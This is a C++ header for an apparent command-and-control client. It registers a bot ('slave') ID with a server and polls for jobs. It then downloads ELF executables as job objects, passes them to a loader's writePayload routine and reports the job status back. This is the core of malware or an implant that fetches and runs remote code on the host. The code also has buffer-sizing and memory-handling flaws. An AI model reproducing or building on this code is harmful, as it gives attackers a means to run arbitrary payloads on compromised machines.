
#include "stdafx.h"
#include "HttpRequest.hpp"
#include "JSONParser.h"
#include "URLs.h"
#include "ServerResponse.h"
#include "ObjectLoader.h"

using namespace std;

#ifndef CONNECTION_CONTROLLER_H
#define CONNECTION_CONTROLLER_H

class ConnectionController {
private: 
    const string slaveId = "e1896e80-c325-11ed-b033-f5252f300caa";
    string computername, username, computerinfo;
    string jobId = "NO_JOBS";
    int objectSize = 0;

    json::JSON httpPOST(const char* URL, const char* body) {

        http::Request requestPOST{URL};
        const auto response = requestPOST.send("POST", body, {
            {"Content-Type", "application/json"}
        });
        return json::parse(string{response.body.begin(), response.body.end()});
    }

    json::JSON httpGET(const char* URL) {

        http::Request requestGET(URL);
        const auto response = requestGET.send("GET");
        return json:: parse(string{response.body.begin(), response.body.end()});
    }

    unsigned char* downloadFile(const char* URL, size_t size) {
        
        unsigned char* file = new unsigned char[size];
        
        http::Request requestGET(URL);
        const auto response = requestGET.send("GET");

        if (!(response.body.at(0) == 0x7f && response.body.at(1) == 0x45 &&
            response.body.at(2) == 0x4c && response.body.at(3) == 0x46)) {
            
            printf("Failed to retrieve job object!\n");
            return NULL;
        }
        
        for (int i = 0; i < response.body.size(); i++) {
            file[i] = response.body.at(i);
        }
        
        return file;
    }

    const char* prepareInitBody() {

        // const char* templateStr = "{\"username\":\"%s\", \"computername\":\"%s\", \"info\":\"%s\", \"slaveId\":\"%s\"}";

        // int strSize = strlen(templateStr) + this->computerinfo.length() + 
        //     this->username.length() + this->computername.length();
            
        // printf("String size: %d\n", strSize);
            
        // char *body = new char[strSize];
        // snprintf(body, strSize, templateStr, this->username.c_str(), 
        //     this->computername.c_str(), this->computerinfo.c_str(), this->slaveId.c_str());


        return "{\"username\":\"tommy\", \"computername\":\"tommy's computer\", \"info\":\"LINUX\", \"id\":\"e1896e80-c325-11ed-b033-f5252f300cfa\"}";
    }

    char* prepareJobURL() {

        // Create URL with jobID.
        char* urlJob = new char[this->jobId.length() + strlen(URL_JOB)];
        snprintf(urlJob, this->jobId.length() + strlen(URL_JOB), URL_JOB, this->jobId.c_str());

        return urlJob;
    }

    char* prepareJobBody(int code) {

        string status = to_string(code);

        char* jobBody = new char[status.length() + strlen(BODY_JOB)];
        snprintf(jobBody, status.length() + strlen(BODY_JOB), BODY_JOB, status.c_str());

        return jobBody;
    }

    char* preparePingURL() {
        char* pingUrl = new char[this->slaveId.length() + strlen(URL_PING)];
        snprintf(pingUrl, this->slaveId.length() + strlen(URL_PING), URL_PING, 
            this->slaveId.c_str());

        return pingUrl;
    }

public:
    ConnectionController() {
        
    }

    // Sets important variables.
    void prepareConnection(string computername, string username, string computerinfo) {
        this->computerinfo = computerinfo;
        this->username = username;
        this->computername = computername;
    }

    // Sends the init request.
    int initConnection() {

        printf("Connecting with id %s\n", this->slaveId.c_str());
        json::JSON responseBody = httpPOST(URL_INIT, prepareInitBody());
        if (responseBody.size() <= 0) {
            return RESPONSE_ERROR; // No response from server.
        }

        int code = json::getInt("code", responseBody);
        if (code == RESPONSE_NEW_OBJECT) {

            this->jobId = json::getStr("id", responseBody);
            this->objectSize = json::getInt("size", responseBody);
        }

        return code;
    }

    // Ping server for status updates or new objects.
    int ping() {

        json::JSON responseBody = httpGET(preparePingURL());
        if (responseBody.size() <= 0) {
            return RESPONSE_ERROR; // No response from server.
        }

        int code = json::getInt("code", responseBody);
        if (code == RESPONSE_NEW_OBJECT) {

            this->jobId = json::getStr("id", responseBody);
            this->objectSize = json::getInt("size", responseBody);
        }

        return code;
    }

    // Get job.
    bool getNewJob(ObjectLoader *loader) {

        if (this->jobId.length() == 0 || this->objectSize <= 0) {
            printf("No job currently!\n");
            return false;
        }

        if (!loader->reserveSpace(this->objectSize)) {
            printf("Couldn't reserve space for job!\n");
            return false;
        }

        char* urlJob = prepareJobURL();

        // Download the file.
        unsigned char* file = downloadFile(urlJob, this->objectSize);
        if (file == NULL) {
            return false;
        }

        return loader->writePayload(file, this->objectSize);
    }

    int finishJob(int status) {

        // Create URL with jobID.
        char* urlJob = prepareJobURL();
        json::JSON responseBody = httpPOST(urlJob, prepareJobBody(status));

        // Clear values.
        this->objectSize = 0;
        this->jobId = "NO_JOB";

        return json::getInt("code", responseBody);
    }
};

#endif // !~ CONNECTION_CONTROLLER_H